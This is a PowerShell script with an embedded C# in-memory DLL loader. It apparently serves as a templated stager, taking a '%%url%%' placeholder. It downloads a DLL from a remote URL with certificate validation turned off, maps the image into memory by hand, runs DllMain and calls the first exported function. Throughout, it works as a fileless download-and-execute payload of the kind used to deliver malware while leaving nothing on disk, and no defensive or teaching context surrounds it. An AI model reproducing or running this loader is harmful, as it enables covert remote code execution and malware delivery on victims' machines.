param([String]$DllUrl="%%url%%")

Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class MemoryDllLoader32
{
    private const UInt16 IMAGE_DOS_SIGNATURE = 0x5A4D;
    private const UInt32 IMAGE_NT_SIGNATURE = 0x00004550;
    private const UInt32 MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000;
    private const UInt32 PAGE_NOACCESS = 0x01, PAGE_READONLY = 0x02, PAGE_READWRITE = 0x04;
    private const UInt32 PAGE_EXECUTE = 0x10, PAGE_EXECUTE_READ = 0x20, PAGE_EXECUTE_READWRITE = 0x40;
    private const UInt32 IMAGE_FILE_DLL = 0x2000;
    private const int DLL_PROCESS_ATTACH = 1;
    private const int IMAGE_REL_BASED_HIGHLOW = 3;
    private const int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;
    private const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
    private const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
    private static extern IntPtr GetProcAddressOrdinal(IntPtr hModule, IntPtr lpProcName);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32", SetLastError = true)]
    private static extern int GetLastError();

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate bool DllMain(IntPtr hinstDLL, UInt32 fdwReason, IntPtr lpReserved);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    public delegate bool SomeExportedFunction();

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DOS_HEADER {
        public UInt16 e_magic, e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res;
        public UInt16 e_oemid, e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2;
        public Int32 e_lfanew;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_FILE_HEADER {
        public UInt16 Machine, NumberOfSections;
        public UInt32 TimeDateStamp, PointerToSymbolTable, NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader, Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_DATA_DIRECTORY { public UInt32 VirtualAddress, Size; }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_OPTIONAL_HEADER32 {
        public UInt16 Magic;
        public byte MajorLinkerVersion, MinorLinkerVersion;
        public UInt32 SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint, BaseOfCode, BaseOfData;
        public UInt32 ImageBase;
        public UInt32 SectionAlignment, FileAlignment;
        public UInt16 MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion;
        public UInt16 MajorSubsystemVersion, MinorSubsystemVersion;
        public UInt32 Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum;
        public UInt16 Subsystem, DllCharacteristics;
        public UInt32 SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit;
        public UInt32 LoaderFlags, NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_NT_HEADERS32 {
        public UInt32 Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] Name;
        public UInt32 VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers;
        public UInt16 NumberOfRelocations, NumberOfLinenumbers;
        public UInt32 Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_IMPORT_DESCRIPTOR {
        public UInt32 OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_THUNK_DATA32 { public UInt32 AddressOfData; }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_BASE_RELOCATION { public UInt32 VirtualAddress, SizeOfBlock; }

    private byte[] _dllBytes;
    private IntPtr _baseAddr;
    private IMAGE_DOS_HEADER _dos;
    private IMAGE_NT_HEADERS32 _nt;
    private IMAGE_SECTION_HEADER[] _secs;
    private Dictionary<string, IntPtr> _exports;

    public MemoryDllLoader32(byte[] dllBytes) { _dllBytes = dllBytes; }

    public void Load() {
        ParseHeaders();
        MapSections();
        HandleRelocations();
        FixImports();
        ProtectSections();
        CallDllMain();
        BuildExportMap();
    }

    private void ParseHeaders() {
        _dos = BytesToStruct<IMAGE_DOS_HEADER>(0);
        if (_dos.e_magic != IMAGE_DOS_SIGNATURE) throw new Exception("DOS");
        _nt = BytesToStruct<IMAGE_NT_HEADERS32>(_dos.e_lfanew);
        if (_nt.Signature != IMAGE_NT_SIGNATURE) throw new Exception("PE");
        if ((_nt.FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) throw new Exception("Not DLL");
    }

    private void MapSections() {
        _baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)_nt.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (_baseAddr == IntPtr.Zero) throw new Exception("VA");
        Marshal.Copy(_dllBytes, 0, _baseAddr, (int)_nt.OptionalHeader.SizeOfHeaders);
        int sectionOffset = _dos.e_lfanew + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS32));
        _secs = new IMAGE_SECTION_HEADER[_nt.FileHeader.NumberOfSections];
        for (int i = 0; i < _secs.Length; i++) {
            _secs[i] = BytesToStruct<IMAGE_SECTION_HEADER>(sectionOffset);
            sectionOffset += Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));
            if (_secs[i].SizeOfRawData > 0) {
                long dest = _baseAddr.ToInt64() + _secs[i].VirtualAddress;
                Marshal.Copy(_dllBytes, (int)_secs[i].PointerToRawData, (IntPtr)dest, (int)_secs[i].SizeOfRawData);
            }
        }
    }

    private void HandleRelocations() {
        var relocDir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size == 0) return;
        long delta = _baseAddr.ToInt64() - (long)_nt.OptionalHeader.ImageBase;
        if (delta == 0) return;
        long ptr = _baseAddr.ToInt64() + relocDir.VirtualAddress, end = ptr + relocDir.Size;
        while (ptr < end) {
            IMAGE_BASE_RELOCATION block = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure((IntPtr)ptr, typeof(IMAGE_BASE_RELOCATION));
            if (block.SizeOfBlock == 0) break;
            long count = (block.SizeOfBlock - Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION))) / 2;
            long list = ptr + Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++) {
                UInt16 entry = (UInt16)Marshal.ReadInt16((IntPtr)(list + 2 * i));
                if ((entry >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                    long patch = _baseAddr.ToInt64() + block.VirtualAddress + (entry & 0xFFF);
                    Marshal.WriteInt32((IntPtr)patch, Marshal.ReadInt32((IntPtr)patch) + (int)delta);
                }
            }
            ptr += block.SizeOfBlock;
        }
    }

    private void FixImports() {
        var impDir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (impDir.Size == 0) return;
        long desc = _baseAddr.ToInt64() + impDir.VirtualAddress;
        while (true) {
            IMAGE_IMPORT_DESCRIPTOR d = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure((IntPtr)desc, typeof(IMAGE_IMPORT_DESCRIPTOR));
            if (d.Name == 0) break;
            string dll = PtrToAnsi((IntPtr)(_baseAddr.ToInt64() + d.Name));
            IntPtr h = LoadLibraryA(dll);
            if (h == IntPtr.Zero) throw new Exception("LL " + dll);
            long thunk = _baseAddr.ToInt64() + d.FirstThunk;
            while (true) {
                IMAGE_THUNK_DATA32 t = (IMAGE_THUNK_DATA32)Marshal.PtrToStructure((IntPtr)thunk, typeof(IMAGE_THUNK_DATA32));
                if (t.AddressOfData == 0) break;
                IntPtr f;
                if ((t.AddressOfData & 0x80000000) != 0) {
                    f = GetProcAddressOrdinal(h, (IntPtr)(t.AddressOfData & 0xFFFF));
                } else {
                    long import = _baseAddr.ToInt64() + t.AddressOfData + 2;
                    f = GetProcAddress(h, PtrToAnsi((IntPtr)import));
                }
                if (f == IntPtr.Zero) throw new Exception("Import");
                Marshal.WriteInt32((IntPtr)thunk, f.ToInt32());
                thunk += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA32));
            }
            desc += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
        }
    }

    private void ProtectSections() {
        long b = _baseAddr.ToInt64();
        for (int i = 0; i < _secs.Length; i++) {
            if (_secs[i].VirtualSize == 0) continue;
            UInt32 c = _secs[i].Characteristics;
            bool x = (c & 0x20000000) != 0, r = (c & 0x40000000) != 0, w = (c & 0x80000000) != 0;
            UInt32 p = x ? (w ? PAGE_EXECUTE_READWRITE : (r ? PAGE_EXECUTE_READ : PAGE_EXECUTE))
                         : (w ? PAGE_READWRITE : (r ? PAGE_READONLY : PAGE_NOACCESS));
            UIntPtr size = (UIntPtr)(_secs[i].VirtualSize != 0 ? _secs[i].VirtualSize : _secs[i].SizeOfRawData);
            UInt32 old;
            if (!VirtualProtect((IntPtr)(b + _secs[i].VirtualAddress), size, p, out old)) throw new Exception("VP");
        }
    }

    private void CallDllMain() {
        if (_nt.OptionalHeader.AddressOfEntryPoint == 0) return;
        DllMain dm = (DllMain)Marshal.GetDelegateForFunctionPointer(
            (IntPtr)(_baseAddr.ToInt64() + _nt.OptionalHeader.AddressOfEntryPoint), typeof(DllMain));
        if (!dm(_baseAddr, DLL_PROCESS_ATTACH, IntPtr.Zero)) throw new Exception("DllMain");
    }

    private void BuildExportMap() {
        _exports = new Dictionary<string, IntPtr>(StringComparer.OrdinalIgnoreCase);
        var expDir = _nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (expDir.Size == 0) return;
        long exp = _baseAddr.ToInt64() + expDir.VirtualAddress;
        UInt32 numNames = (UInt32)Marshal.ReadInt32((IntPtr)(exp + 0x18));
        UInt32 funcTable = (UInt32)Marshal.ReadInt32((IntPtr)(exp + 0x1C));
        UInt32 nameTable = (UInt32)Marshal.ReadInt32((IntPtr)(exp + 0x20));
        UInt32 ordTable = (UInt32)Marshal.ReadInt32((IntPtr)(exp + 0x24));
        long base64 = _baseAddr.ToInt64();
        for (int i = 0; i < numNames; i++) {
            string fn = PtrToAnsi((IntPtr)(base64 + Marshal.ReadInt32((IntPtr)(base64 + nameTable + i * 4))));
            UInt16 ord = (UInt16)Marshal.ReadInt16((IntPtr)(base64 + ordTable + i * 2));
            IntPtr addr = (IntPtr)(base64 + Marshal.ReadInt32((IntPtr)(base64 + funcTable + ord * 4)));
            if (!_exports.ContainsKey(fn)) _exports.Add(fn, addr);
        }
    }

    public IntPtr GetProcAddress(string name) {
        if (_exports == null || _exports.Count == 0) throw new Exception("NoExport");
        if (_exports.ContainsKey(name)) return _exports[name];
        throw new Exception("Export");
    }

    public string[] GetExportedFunctionNames() {
        return _exports == null ? new string[0] : new List<string>(_exports.Keys).ToArray();
    }

    private T BytesToStruct<T>(int offset) where T : struct {
        IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(T)));
        Marshal.Copy(_dllBytes, offset, buf, Marshal.SizeOf(typeof(T)));
        T val = (T)Marshal.PtrToStructure(buf, typeof(T));
        Marshal.FreeHGlobal(buf);
        return val;
    }

    private static string PtrToAnsi(IntPtr p) { return p == IntPtr.Zero ? null : Marshal.PtrToStringAnsi(p); }
}
"@

Write-Host "[INFO] Attempting to fetch DLL from $DllUrl"
[System.Net.ServicePointManager]::SecurityProtocol  = [System.Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData($DllUrl)
} catch {
    Write-Host "[CRIT!] Download failed: $($_.Exception.Message)"
    return
}
if (!$bytes -or $bytes.Length -eq 0) {
    Write-Host "[CRIT!] Empty payload"
    return
}
Write-Host "[INFO] Downloaded $($bytes.Length) bytes"
try {
    $loader = [MemoryDllLoader32]::new($bytes)
    $loader.Load()
    Write-Host "[ OUT ] DLL mapped to memory successfully!"
} catch {
    Write-Host "[CRIT!] Loader error: $($_.Exception.Message)"
    return
}
$exports = $loader.GetExportedFunctionNames()
if ($exports.Count -eq 0) {
    Write-Host "[INFO] No exports found. Done."
    return
}
Write-Host "[INFO] Found $($exports.Count) export(s): $($exports -join ', ')"
$ExportName = $exports[0]
try {
    $ptr      = $loader.GetProcAddress($ExportName)
    $delegate = [MemoryDllLoader32+SomeExportedFunction]
    $del      = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, $delegate)
    Write-Host "[ OUT ] Invoking $ExportName ..."
    $ret = $del.Invoke()
    Write-Host "[ OUT ] Export returned: $ret"
} catch {
    Write-Host "[INFO] Export call failed: $($_.Exception.Message)"
}
Write-Host "[FINAL] Done!"
